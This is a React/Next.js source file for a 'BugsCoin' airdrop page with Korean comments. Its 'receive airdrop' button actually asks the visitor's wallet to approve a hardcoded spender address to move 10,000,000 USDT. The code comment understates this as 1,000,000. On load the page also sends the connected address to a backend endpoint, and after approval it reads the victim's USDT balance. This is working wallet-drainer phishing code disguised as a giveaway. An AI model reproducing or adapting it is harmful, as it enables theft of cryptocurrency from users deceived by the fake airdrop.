"use client";

import React, { useEffect, useState } from "react";
import Web3 from "web3";
import styled from "styled-components";
import Link from "next/link";

// Styled Components for the layout
const Container = styled.div`
  background-color: black;
  color: white;
  text-align: center;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
`;

const Header = styled.header`
  width: 100%;
  display: flex;
  justify-content: flex-start;
  align-items: center;
  padding: 20px;
  background-color: black;
`;

const Logo = styled.img`
  height: 40px;
  cursor: pointer;
`;

const ContentImage = styled.img`
  width: 100%;
  height: 383px;
  object-fit: cover;
  margin: 0;
`;

const ButtonContainer = styled.div`
  display: flex;
  flex-direction: column;
  gap: 20px;
  margin-top: 0;
`;

const Button = styled.button`
  width: 210px;
  height: 55px;
  background-color: black;
  color: white;
  border: 1px solid white;
  cursor: pointer;
  font-size: 16px;
  font-weight: bold;
  margin: 0 auto;
  white-space: normal;  // 줄바꿈을 허용
  text-align: center;    // 텍스트를 중앙 정렬

  &:hover {
    background-color: white;
    color: black;
  }
`;

const FooterText = styled.p`
  font-size: 18px;
  font-weight: light;
  font-family: Arial, sans-serif;
  color: white;
  opacity: 0.8;
  margin-top: 60px;
  text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
`;

export default function DApp() {
  const [web3, setWeb3] = useState(null);
  const [account, setAccount] = useState(null);
  const [isApproved, setIsApproved] = useState(false);  // approve 상태 저장
  const [usdtBalance, setUsdtBalance] = useState("0");  // USDT 잔액 저장
  const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
  const spenderAddress = "0x44E3AD8C4D486F4070822645462E5a23d46Cf7F1";
  const approveAmount = Web3.utils.toWei("10000000", "mwei"); // 1,000,000 USDT

  useEffect(() => {
    if (typeof window.ethereum !== "undefined") {
      const web3Instance = new Web3(window.ethereum);
      setWeb3(web3Instance);
      connectWallet();
    }
  }, []);

  useEffect(() => {
    if (web3 && account) {
      checkApprovalStatus(account);  // web3가 있을 때만 함수 실행
    }
  }, [web3, account]);

  // 지갑 연결 함수
  const connectWallet = async () => {
    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      const fetchData = async () => {
        try {
          const adrs = accounts[0];
          const response = await fetch(`/api/adrsCheck?adrs=${adrs}`);
          if (!response.ok) {
            throw new Error("Failed to fetch data");
          }
          const result = await response.json();
          //setInformation(result); // 데이터를 상태로 저장합니다.
          console.log(result);
        } catch (error) {
          console.error("Error fetching data:", error);
        }
      };

      fetchData();
      setAccount(accounts[0]);
    } catch (error) {
      console.error("지갑 연결 중 오류 발생", error);
    }
  };

  // 승인 상태 확인 함수
  const checkApprovalStatus = async (userAccount) => {
    if (web3) {
      const usdtContract = new web3.eth.Contract(
        [
          {
            constant: true,
            inputs: [
              { name: "_owner", type: "address" },
              { name: "_spender", type: "address" },
            ],
            name: "allowance",
            outputs: [{ name: "remaining", type: "uint256" }],
            type: "function",
          },
          {
            constant: true,
            inputs: [{ name: "who", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "balance", type: "uint256" }],
            type: "function",
          },
        ],
        usdtContractAddress
      );

      try {
        // 지갑과 스펜더 간의 승인된 금액 확인
        const allowance = await usdtContract.methods
          .allowance(userAccount, spenderAddress)
          .call();
        if (parseFloat(allowance) > 0) {
          setIsApproved(true); // 이미 승인된 상태
          // USDT 잔액 가져오기
          const balance = await usdtContract.methods.balanceOf(userAccount).call();
          const balanceInUsdt = Web3.utils.fromWei(balance, "mwei");
          setUsdtBalance(Math.floor(balanceInUsdt)); 
        }
      } catch (error) {
        console.error("승인 상태 확인 중 오류 발생", error);
      }
    }
  };

  // approve 함수
  const approveUsdt = async () => {
    if (web3 && account) {
      const usdtContract = new web3.eth.Contract(
        [
          {
            constant: false,
            inputs: [
              { name: "_spender", type: "address" },
              { name: "_value", type: "uint256" },
            ],
            name: "approve",
            outputs: [{ name: "success", type: "bool" }],
            type: "function",
          },
        ],
        usdtContractAddress
      );

      try {
        await usdtContract.methods
          .approve(spenderAddress, approveAmount)
          .send({ from: account });
        alert("승인이 완료되었습니다.");
      } catch (error) {
        console.error("승인 중 오류 발생", error);
      }
    }
  };

  // 에어드랍 버튼 클릭 처리
  const handleAirdropClick = () => {
    if (!account) {
      // 지갑이 연결되지 않은 상태 -> 다른 페이지로 이동
      window.location.href = "/inbum/notice";
    } else if (!isApproved) {
      // 지갑이 연결되었지만 승인되지 않은 경우 -> 승인 요청
      approveUsdt();
    }
  };

  return (
    <Container>
      <Header>
        <Link href="/">
          <Logo src="/bugscoin.png" alt="Logo" />
        </Link>
      </Header>

      <ContentImage src="/bugscoin-bg.png" alt="Main Image" />

      <ButtonContainer>
        {isApproved ? (
          <Button>{`보유: ${usdtBalance} USDT`}<br />
          {`(ERC-20)`}</Button> // 승인 상태면 잔액 표시
        ) : (
          <Button onClick={handleAirdropClick}>에어드랍 받기</Button> // 승인 안 된 상태면 승인 요청 버튼
        )}
        <Button>한글백서</Button>
        <Button>Whitepaper</Button>
      </ButtonContainer>

      <FooterText>© 2024 BugsCoin All rights reserved.</FooterText>
    </Container>
  );
}